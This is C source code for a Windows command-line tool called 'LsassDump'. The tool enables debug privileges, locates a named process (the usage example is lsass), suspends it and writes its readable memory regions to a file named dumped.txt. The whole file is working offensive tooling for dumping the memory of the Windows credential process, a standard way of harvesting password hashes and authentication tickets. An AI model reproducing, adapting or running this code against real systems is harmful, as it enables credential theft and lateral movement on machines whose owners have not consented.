#include <stdio.h>
#include <stdbool.h>
#include <Windows.h>
#include <TlHelp32.h>

bool SetPrivilege(HANDLE hToken, LPCTSTR Privilege, BOOL bEnablePrivilege) {
    TOKEN_PRIVILEGES tp = { 0 };
    LUID luid;

    if (!LookupPrivilegeValue(NULL, Privilege, &luid)) {
        return false;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = (bEnablePrivilege) ? SE_PRIVILEGE_ENABLED : 0;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        return false;
    }

    return (GetLastError() == ERROR_SUCCESS);
}
typedef LONG(NTAPI* NtSuspendProcess)(HANDLE ProcessHandle);
typedef LONG(NTAPI* NtResumeProcess)(HANDLE ProcessHandle);

void suspend(DWORD processId)
{
    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!processHandle)
    {
        printf("[!] Error opening process: %d\n", GetLastError());
        return;
    }

    HMODULE ntdll = GetModuleHandle(L"ntdll");
    if (!ntdll)
    {
        printf("[!] Error getting handle to ntdll.dll\n");
        CloseHandle(processHandle);
        return;
    }

    NtSuspendProcess pfnNtSuspendProcess = (NtSuspendProcess)GetProcAddress(ntdll, "NtSuspendProcess");
    if (!pfnNtSuspendProcess)
    {
        printf("[!] Error getting address of NtSuspendProcess function\n");
        CloseHandle(processHandle);
        return;
    }

    if (pfnNtSuspendProcess(processHandle) != 0)
    {
        printf("[!] Error suspending the process: %d\n", GetLastError());
    }
    else
    {
        printf("[+] Process suspended successfully\n");
    }

    CloseHandle(processHandle);
}
void resume(DWORD processId)
{
    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!processHandle)
    {
        printf("[!] Error opening process: %d\n", GetLastError());
        return;
    }

    HMODULE ntdll = GetModuleHandle(L"ntdll");
    if (!ntdll)
    {
        printf("[!] Error getting handle to ntdll.dll\n");
        CloseHandle(processHandle);
        return;
    }

    NtResumeProcess pfnNtResumeProcess = (NtResumeProcess)GetProcAddress(ntdll, "NtResumeProcess");
    if (!pfnNtResumeProcess)
    {
        printf("[!] Error getting address of NtResumeProcess function\n");
        CloseHandle(processHandle);
        return;
    }

    if (pfnNtResumeProcess(processHandle) != 0)
    {
        printf("[!] Error resuming the process: %d\n", GetLastError());
    }
    else
    {
        printf("[+] Process resumed successfully\n");
    }

    CloseHandle(processHandle);
}

void main(int argc, char* argv[]) {
    printf("  _                        _____                        \n");
    printf(" | |                      |  __ \\                       \n");
    printf(" | |     ___  __ _ ___ ___| |  | |_   _ _ __ ___  _ __  \n");
    printf(" | |    / __|/ _` / __/ __| |  | | | | | '_ ` _ \\| '_ \\ \n");
    printf(" | |____\\__ \\ (_| \\__ \\__ \\ |__| | |_| | | | | | | |_) |\n");
    printf(" |______|___/\\__,_|___/___/_____/ \\__,_|_| |_| |_| .__/ \n");
    printf("                                                 | |    \n");
    printf("                                                 |_|    \n");

    if (argc == 1) {
        printf("\nUSAGE: .\\LsassDump.exe <ProcessName>\n");
        printf("EXAMPLE: .\\LsassDump.exe lsass\n");
    }
    else {
        HANDLE hToken;
        OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
        SetPrivilege(hToken, SE_DEBUG_NAME, TRUE);
        SetPrivilege(hToken, SE_BACKUP_NAME, TRUE);
        SetPrivilege(hToken, SE_RESTORE_NAME, TRUE);
        const wchar_t* processName = L"";
        size_t length = strlen(argv[1]);
        wchar_t* wProcessName = (wchar_t*)malloc((length + 1) * sizeof(wchar_t));
        mbstowcs(wProcessName, argv[1], length + 1);
        processName = wProcessName;

        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);

        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

        if (Process32First(hSnapshot, &pe32)) {
            while (Process32Next(hSnapshot, &pe32)) {
                if (wcscmp(pe32.szExeFile, processName) == 0) {
                    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);

                    printf("The process ID is: %d\n\n", pe32.th32ProcessID);
                    printf("Dumping process with ID %d...\n\n", pe32.th32ProcessID);

                    // Suspend the process before memory dumping
                    //DWORD suspendCount = SuspendThread(hProcess);
                    suspend(pe32.th32ProcessID);
                    //if (suspendCount == -1) {
                    //    printf("[!] Error suspending the process: %d\n", GetLastError());
                    //    CloseHandle(hProcess);
                    //    break;
                    //}

                    SYSTEM_INFO sysInfo;
                    GetSystemInfo(&sysInfo);

                    MEMORY_BASIC_INFORMATION memInfo;
                    LPVOID lpAddress = sysInfo.lpMinimumApplicationAddress;

                    HANDLE hFile = CreateFile(L"dumped.txt", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

                    if (hFile != INVALID_HANDLE_VALUE) {
                        while ((uintptr_t)lpAddress < (uintptr_t)sysInfo.lpMaximumApplicationAddress) {
                            if (VirtualQueryEx(hProcess, lpAddress, &memInfo, sizeof(MEMORY_BASIC_INFORMATION))) {
                                if (memInfo.State == MEM_COMMIT && (memInfo.Protect == PAGE_READWRITE || memInfo.Protect == PAGE_EXECUTE_READWRITE)) {
                                    SIZE_T bytesRead;
                                    BYTE* buffer = (BYTE*)malloc(memInfo.RegionSize);
                                    ReadProcessMemory(hProcess, memInfo.BaseAddress, buffer, memInfo.RegionSize, &bytesRead);

                                    DWORD bytesWritten;
                                    WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL);

                                    free(buffer);
                                }

                                lpAddress = (LPVOID)((uintptr_t)lpAddress + memInfo.RegionSize);
                            }
                            else {
                                lpAddress = (LPVOID)((uintptr_t)lpAddress + sysInfo.dwPageSize);
                            }
                        }

                        CloseHandle(hFile);
                        printf("DONE! Check the 'dumped.txt' file!\n");
                    }
                    else {
                        printf("[!] Error creating dump file: %d\n", GetLastError());
                    }

                    // Resume the suspended process
                    resume(pe32.th32ProcessID);

                    CloseHandle(hProcess);
                    break;
                }
            }
        }

        CloseHandle(hSnapshot);
    }
}
